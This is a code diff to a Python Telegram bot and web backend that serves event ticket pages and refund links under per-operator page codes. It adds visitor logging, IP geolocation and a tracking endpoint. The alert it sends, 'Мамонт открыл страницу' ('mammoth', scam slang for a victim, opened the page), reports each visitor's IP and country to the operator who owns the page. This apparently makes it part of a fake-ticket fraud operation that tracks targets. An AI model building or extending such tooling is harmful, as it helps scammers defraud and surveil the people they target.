@@ -188,8 +188,169 @@ def save_refund_link(code, price, currency):
     c.execute('INSERT OR REPLACE INTO refund_links (code, price, currency) VALUES (?, ?, ?)', (code, price, currency))
     conn.commit()
 
+# --- Таблица для логування дій користувачів ---
+c.execute("""
+CREATE TABLE IF NOT EXISTS user_activity_logs (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    page_code TEXT NOT NULL,
+    user_ip VARCHAR(45),
+    user_country TEXT,
+    page_name TEXT,
+    page_url TEXT,
+    action_type TEXT,
+    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    user_agent TEXT,
+    referer TEXT
+)
+""")
+conn.commit()
+
+# Створюємо індекси для швидкого пошуку
+try:
+    conn.execute('CREATE INDEX IF NOT EXISTS idx_activity_page_code ON user_activity_logs(page_code)')
+    conn.execute('CREATE INDEX IF NOT EXISTS idx_activity_timestamp ON user_activity_logs(timestamp)')
+    conn.execute('CREATE INDEX IF NOT EXISTS idx_activity_ip ON user_activity_logs(user_ip)')
+except Exception:
+    pass
+
 def generate_short_code(length=3):
     return ''.join(random.choices(string.ascii_uppercase, k=length))
+
+def get_country_by_ip(ip):
+    """Отримує країну за IP з кешу або API"""
+    if not ip or ip in ['127.0.0.1', 'localhost', '::1']:
+        return "Local"
+    
+    # Перевіряємо кеш
+    if hasattr(get_country_by_ip, 'cache') and ip in get_country_by_ip.cache:
+        return get_country_by_ip.cache[ip]
+    
+    try:
+        response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
+        if response.status_code == 200:
+            data = response.json()
+            country_code = data.get('country', 'Unknown')
+            country_full = data.get('country_name', country_code)
+            
+            # Кешуємо результат
+            if not hasattr(get_country_by_ip, 'cache'):
+                get_country_by_ip.cache = {}
+            get_country_by_ip.cache[ip] = country_full
+            
+            return country_full
+        else:
+            return "Unknown"
+    except Exception:
+        return "Unknown"
+
+def get_page_name_from_url(url_path, page_code=None):
+    """Визначає назву сторінки за шляхом та page_code"""
+    if not url_path or url_path == '/' or url_path == '/index.html':
+        if page_code:
+            # Визначаємо назву події за page_code
+            try:
+                series = int(page_code.split('-')[0])
+                event_names = [
+                    "Terroir and Traditions",
+                    "Collection Co–selection", 
+                    "Snucie",
+                    "Art that saves lives",
+                    "Gotong Royong",
+                    "Anna Konik",
+                    "Uncensored",
+                    "Jacek Adamas"
+                ]
+                if 1 <= series <= len(event_names):
+                    return f"Головна сторінка ({event_names[series-1]})"
+            except:
+                pass
+        return "Головна сторінка"
+    elif '/buy-tickets/' in url_path:
+        if '/code/' in url_path:
+            return "Оформлення замовлення (код)"
+        elif '/quantity/' in url_path:
+            return "Оформлення замовлення (кількість)"
+        elif '/payment/' in url_path:
+            return "Оформлення замовлення (оплата)"
+        else:
+            return "Оформлення замовлення"
+    elif '/events/' in url_path:
+        if '/overview/' in url_path:
+            return "Огляд події"
+        elif '/details/' in url_path:
+            return "Деталі події"
+        else:
+            return "Події"
+    elif '/about/' in url_path:
+        return "Про нас"
+    elif '/contact/' in url_path:
+        return "Контакти"
+    elif '/gallery/' in url_path:
+        return "Галерея"
+    else:
+        # Спробуємо витягнути назву з шляху
+        clean_path = url_path.strip('/').replace('-', ' ').replace('_', ' ').title()
+        if clean_path:
+            return clean_path
+        return "Невідома сторінка"
+
+def log_user_activity(page_code, user_ip, page_url, action_type="page_view", user_agent=None, referer=None):
+    """Логує дію користувача"""
+    try:
+        c = conn.cursor()
+        
+        # Отримуємо країну за IP
+        user_country = get_country_by_ip(user_ip)
+        
+        # Визначаємо назву сторінки
+        page_name = get_page_name_from_url(page_url, page_code)
+        
+        # Додаємо лог
+        c.execute('''
+            INSERT INTO user_activity_logs 
+            (page_code, user_ip, user_country, page_name, page_url, action_type, user_agent, referer)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (page_code, user_ip, user_country, page_name, page_url, action_type, user_agent, referer))
+        
+        conn.commit()
+        
+        # Відправляємо повідомлення адміну
+        send_activity_notification_to_admin(page_code, user_ip, user_country, page_name, page_url, action_type)
+        
+        print(f'[ACTIVITY LOG] {action_type} | {page_code} | {user_ip} | {user_country} | {page_name}')
+        
+    except Exception as e:
+        print(f'[ERROR] Failed to log user activity: {e}')
+
+def send_activity_notification_to_admin(page_code, user_ip, user_country, page_name, page_url, action_type):
+    """Відправляє повідомлення про активність користувача адміну"""
+    try:
+        # Отримуємо admin_id за page_code
+        c = conn.cursor()
+        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+        row = c.fetchone()
+        
+        if not row:
+            # Якщо не знайдено в event_links, шукаємо в site_users
+            c.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
+            row = c.fetchone()
+        
+        if row:
+            admin_id = row[0]
+            
+            # Формуємо повідомлення
+            message = f"""🔔Мамонт открыл страницу ({page_name})
+
+📎Страница: {page_name}
+#️⃣Ссылка: ?page={page_code}
+📶IP: {user_ip}
+🌎Страна: {user_country}"""
+            
+            # Відправляємо повідомлення
+            asyncio.create_task(bot.send_message(admin_id, message))
+            
+    except Exception as e:
+        print(f'[ERROR] Failed to send activity notification: {e}')
 
 
 def get_page_code_for_user(uid):
@@ -1843,7 +2004,7 @@ async def ticket_input_handler(message: types.Message):
         
         # Білий прямокутник всередині сірого (менший по ширині та довжині, як на другому скріншоті)
         c.setFillColorRGB(1, 1, 1)  # Білий колір
-        c.rect(80, 140, width - 160, height - 140, fill=1)  # Додано мінімальний відступ зверху від сірого прямокутника
+        c.rect(80, 200, width - 160, height - 200, fill=1)  # Відступ зверху 200px, знизу 0px
         
         # Верхний домен по центру, серым (опускаємо нижче для рамки)
         top_y = height - 60
@@ -1962,11 +2123,19 @@ async def ticket_input_handler(message: types.Message):
             logging.error(f"[TICKET PDF SEND ERROR] {e}")
             await message.answer(f"❌ Ошибка при отправке PDF: {e}")
         
-        # Отправляем ссылку
+        # Отправляем и кнопку, и ссылку для максимального удобства
+        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+        
+        ticket_kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🎫 Открыть билет", url=ticket_url)]
+        ])
+        
         await message.answer(
             f"🔗 **Ссылка на билет:**\n"
             f"`{ticket_url}`\n\n"
-            f"💡 Вы можете открыть эту ссылку в браузере или поделиться ею",
+            f"💡 Нажмите кнопку ниже, чтобы сразу перейти на страницу билета\n"
+            f"📋 Или скопируйте ссылку выше",
+            reply_markup=ticket_kb,
             parse_mode="Markdown"
         )
         
@@ -3608,6 +3777,34 @@ async def event_time_api(request):
     return web.json_response({'time': ''})
 
 @log_function
+async def log_activity_endpoint(request):
+    """API endpoint для логування активності користувачів"""
+    try:
+        data = await request.json()
+        page_code = data.get('page_code', '')
+        page_url = data.get('page_url', '')
+        action_type = data.get('action_type', 'page_view')
+        user_agent = data.get('user_agent', '')
+        referer = data.get('referer', '')
+        
+        # Отримуємо IP користувача
+        user_ip = request.headers.get('X-Forwarded-For', 
+                    request.headers.get('X-Real-IP', 
+                    request.remote))
+        
+        if not page_code:
+            return web.json_response({'error': 'page_code is required'}, status=400)
+        
+        # Логуємо активність
+        log_user_activity(page_code, user_ip, page_url, action_type, user_agent, referer)
+        
+        return web.json_response({'status': 'success', 'message': 'Activity logged'})
+        
+    except Exception as e:
+        print(f'[ERROR] log_activity_endpoint: {e}')
+        return web.json_response({'error': str(e)}, status=500)
+
+@log_function
 async def event_data_api(request):
     """Оптимізований API для отримання всіх даних івенту за один запит"""
     page_code = request.query.get('page', '')
@@ -3875,6 +4072,7 @@ if __name__ == '__main__':
         app.router.add_get('/api/event_date', event_date_api)
         app.router.add_get('/api/event_time', event_time_api)
         app.router.add_get('/api/event_data', event_data_api)  # <-- Додаємо новий endpoint
+        app.router.add_post('/api/log_activity', log_activity_endpoint)  # <-- Додаємо endpoint для логування
         runner = web.AppRunner(app)
         await runner.setup()
         
